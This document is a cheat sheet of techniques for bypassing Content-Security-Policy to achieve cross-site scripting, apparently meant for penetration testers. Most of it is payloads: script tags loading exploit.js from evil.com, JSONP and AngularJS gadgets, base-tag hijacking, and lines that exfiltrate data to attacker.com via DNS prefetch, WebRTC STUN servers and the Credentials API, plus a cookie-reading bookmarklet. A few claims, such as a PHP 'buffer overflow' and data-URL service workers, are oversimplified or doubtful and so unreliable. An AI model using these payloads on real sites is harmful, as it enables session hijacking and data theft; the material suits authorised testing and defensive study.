# 1. Quick CSP Detection

```yaml
Look for these headers:
Content-Security-Policy: [Blocking]
Content-Security-Policy-Report-Only: [Monitoring only]
```

# 2. Common Misconfigurations to Test
**A. "unsafe-inline" Present**
```yaml
If CSP includes: 'unsafe-inline'
→ Regular XSS works immediately
Payload: <script>alert(1)</script>
```

**B. Wildcard (*) in Script Sources**
```yaml
If CSP includes: script-src *
→ Load external scripts from anywhere
Payload: <script src="https://evil.com/exploit.js">
```

**C. Missing "object-src" Directive**
```yaml
If only script-src is defined:
→ Abuse <object> tags
Payload: <object data="data:text/html,<script>alert(1)</script>">
```

**D. Self + File Upload**
```yaml
If: script-src 'self'
→ Upload JS file → reference it
Payload: <script src="/uploads/evil.js">
```

# 3. Bypass Techniques

**A. JSONP Endpoints**
```yaml
If whitelisted domain has JSONP:
<script src="https://google.com/complete/search?callback=alert(1)">
```

**B. AngularJS + Whitelisted CDN**
```yaml
<script src="https://cdnjs.cloudflare.com/angular.js"></script>
<div ng-app>{{$event.view.alert(1)}}</div>
```

**C. CSP Injection (Chrome)**
```yaml
Inject: ;script-src-elem *
Example: param=;script-src-elem *&x=<script>alert(1)</script>
```

**D. Iframe CSP Override**
```yaml
<iframe csp="script-src *" src="javascript:alert(1)">
```

**E. Meta Tag CSP Override**
```yaml
If you can inject in head:
<meta http-equiv="Content-Security-Policy" content="script-src *">
```

# 4. Special Character Bypasses

```yaml
Underscores in domains (Chrome/Firefox):
script-src https://trusted_.com → Allows trusted_.com

Special chars (Safari):
script-src https://trusted}.com → Allows trusted}.com
```

# 5. DNS Prefetch Exfiltration

```yaml
When connect-src blocks external requests:
<link rel="dns-prefetch" href="//[data].attacker.com">
```

# 6. WebRTC Bypass

```yaml
WebRTC often bypasses connect-src:
new RTCPeerConnection({iceServers:[{urls:"stun:[data].attacker.com"}]})
```

# 7. Relative Path Overwrite (RPO)

```yaml
If path allowed: https://example.com/scripts/react/
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js">
→ Loads: https://example.com/scripts/angular/angular.js
```

# 8. Open Redirect + Whitelisted Domain

```yaml
If https://trusted.com is whitelisted:
<script src="https://trusted.com/redirect?url=https://evil.com/exploit.js">
```

# 9. Service Workers

```yaml
serviceWorker.importScripts() bypasses CSP:
navigator.serviceWorker.register('data:,...importScripts("https://evil.com/exploit.js")')
```

# 10. Bookmarklet Attack

```yaml
Drag this to bookmarks, click when on target:
javascript:alert(document.cookie)
```

# 11. Strict-dynamic Abuse

```yaml
If CSP: script-src 'nonce-abc' 'strict-dynamic'
<script nonce="abc">// Create new script tag with your payload</script>
```

# 12. Missing base-uri

```yaml
If base-uri not set:
<base href="https://attacker.com/">
<script src="/js/app.js"> → Loads from attacker.com
```

# 13. PHP Buffer Overflow

```yaml
Send 4100+ bytes in request → PHP warning → CSP header not sent
```

# 14. Error Page Overwrite

```yaml
Open error page (no CSP) → rewrite content:
a = open("/"+"x".repeat(4100))
setTimeout(()=>{a.document.body.innerHTML='<script>alert(1)</script>'},1000)
```

# 15. Credentials API Leak

```yaml
navigator.credentials.store({
  iconURL:"https://[data].attacker.com/leak.png"
})
```

